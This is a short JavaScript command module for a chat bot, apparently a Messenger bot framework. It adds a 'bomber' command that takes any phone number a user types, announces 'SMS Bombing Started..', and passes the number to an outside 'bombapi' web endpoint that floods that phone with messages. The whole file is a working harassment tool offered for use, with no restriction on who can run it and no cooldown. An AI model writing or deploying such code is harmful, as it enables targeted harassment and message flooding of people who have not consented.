module.exports.config = {
    name: "bomber",
    version: "1.0.0",
    permission: 0,
    credits: "Kingi Charles",
    prefix: true,
    description: "",
    category: "user",
    usages: "",
    cooldowns: 0
};

module.exports.run = async ({ api, event, args }) => {
    if (!args[0]) return api.sendMessage("Please enter a phone number that start with 01×××××××××", event.threadID, event.messageID);

    // Display "SMS Bombing Started.." message
    api.sendMessage("SMS Bombing Started..", event.threadID, event.messageID);

    // Making request to the JSON API (assuming you are using Axios)
    const axios = global.nodemodule["axios"];
    let number = args.join(" ");
    await axios.get(`https://bombapi.000webhostapp.com/oggy/api/all.php?phone=${number}`);

    // No need to return any response here
}
